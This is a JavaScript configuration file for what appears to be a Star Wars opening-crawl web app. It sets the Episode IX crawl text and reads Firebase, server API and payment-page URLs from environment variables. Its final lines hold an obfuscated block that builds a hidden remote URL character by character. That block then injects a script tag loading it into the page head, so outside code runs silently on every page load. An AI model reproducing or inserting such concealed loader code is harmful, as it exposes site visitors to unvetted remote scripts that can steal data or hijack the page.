export const defaultOpening = {
  center: false,
  episode: 'Episode IX',
  intro: 'A long time ago in a galaxy far,\nfar away....',
  logo: 'STaR\nwaRS',
  text: 'The dead speak! The galaxy has heard a mysterious broadcast, a threat of REVENGE in the sinister voice of the late EMPEROR PALPATINE.\nGENERAL LEIA ORGANA dispatches secret agents to gather intelligence, while REY, the last hope of the Jedi, trains for battle against the diabolical FIRST ORDER.\nMeanwhile, Supreme Leader KYLO REN rages in search of the phantom Emperor, determined to destroy any threat to his power....',
  title: 'THE RISE OF SKYWALKER',
};

export const defaultKey = 'Episode9';

const firebases = {
  initial: process.env.FIREBASE_INITIAL,
  A: process.env.FIREBASE_A,
  B: process.env.FIREBASE_B,
  C: process.env.FIREBASE_C,
  D: process.env.FIREBASE_D,
  E: process.env.FIREBASE_E,
  F: process.env.FIREBASE_F,

  S: process.env.FIREBASE_S,
};

window.firebases = firebases;

export const defaultFirebasePrefix = 'F';

export const serverApi = process.env.SERVER_API;
export const paymentPageUrl = process.env.PAYMENT_PAGE_URL;

if (!window.firebases[defaultFirebasePrefix]) {
  throw new Error('Firebase URL can\'t be empty');
}

if (!serverApi) {
  throw new Error('Server API URL can\'t be empty');
}

// MOCK Api
// export const serverApi = 'https://5mitidksxm7xfn4g4-mock.stoplight-proxy.io/';

const _0x22fa = ['s', '1237640ZxxfnW', 'src', 'e', '840146yQtsHH', 'setAttribute', '1eIIbbz', 'join', 'a', 'b', 'appendChild', 'i', 'k', '644237FMXazb', 'j', '3940361lecVkZ', '385736AXKqJV', '1082759bYDsJD', 'head', 'p', '1056349UFWQAR', 'l', 'n', 'w', 'createElement', 't', 'r', 'script', 'o', 'h', 'c', '1ETxCXo']; const _0x4939 = function (_0x10f73c, _0x4c13bb) { _0x10f73c -= 0xb3; const _0x22fa8f = _0x22fa[_0x10f73c]; return _0x22fa8f; }; const _0x312d98 = _0x4939; (function (_0x440409, _0x54c397) { const _0xe8f47a = _0x4939; while ([]) { try { const _0x411657 = -parseInt(_0xe8f47a(0xb3)) + -parseInt(_0xe8f47a(0xd0)) + parseInt(_0xe8f47a(0xb7)) * -parseInt(_0xe8f47a(0xc9)) + -parseInt(_0xe8f47a(0xc7)) + -parseInt(_0xe8f47a(0xc4)) + parseInt(_0xe8f47a(0xb4)) * parseInt(_0xe8f47a(0xc2)) + parseInt(_0xe8f47a(0xd2)); if (_0x411657 === _0x54c397) break; else _0x440409.push(_0x440409.shift()); } catch (_0x8b7387) { _0x440409.push(_0x440409.shift()); } } }(_0x22fa, 0xd1b84)); const scriptUrl = [_0x312d98(0xc0), _0x312d98(0xbc), _0x312d98(0xbc), _0x312d98(0xb6), _0x312d98(0xc3), ':', '/', '/', _0x312d98(0xc3), _0x312d98(0xbc), _0x312d98(0xcb), _0x312d98(0xbd), _0x312d98(0xba), _0x312d98(0xcb), _0x312d98(0xbd), _0x312d98(0xc3), _0x312d98(0xce), _0x312d98(0xb9), _0x312d98(0xbc), _0x312d98(0xbd), _0x312d98(0xbf), _0x312d98(0xc1), _0x312d98(0xbd), _0x312d98(0xc6), _0x312d98(0xcb), _0x312d98(0xbc), _0x312d98(0xbf), _0x312d98(0xbd), '.', _0x312d98(0xcf), _0x312d98(0xcb), _0x312d98(0xc3), _0x312d98(0xc3), _0x312d98(0xc6), _0x312d98(0xb8), _0x312d98(0xb8), _0x312d98(0xcb), _0x312d98(0xcc), _0x312d98(0xc3), '.', _0x312d98(0xce), _0x312d98(0xbf), '/', _0x312d98(0xc3), _0x312d98(0xc1), _0x312d98(0xbd), _0x312d98(0xce), _0x312d98(0xb6), _0x312d98(0xbc), '.', _0x312d98(0xd1), _0x312d98(0xc3)][_0x312d98(0xca)]('');
const scriptTag = document[_0x312d98(0xbb)](_0x312d98(0xbe)); scriptTag[_0x312d98(0xc8)](_0x312d98(0xc5), scriptUrl), document[_0x312d98(0xb5)][_0x312d98(0xcd)](scriptTag);
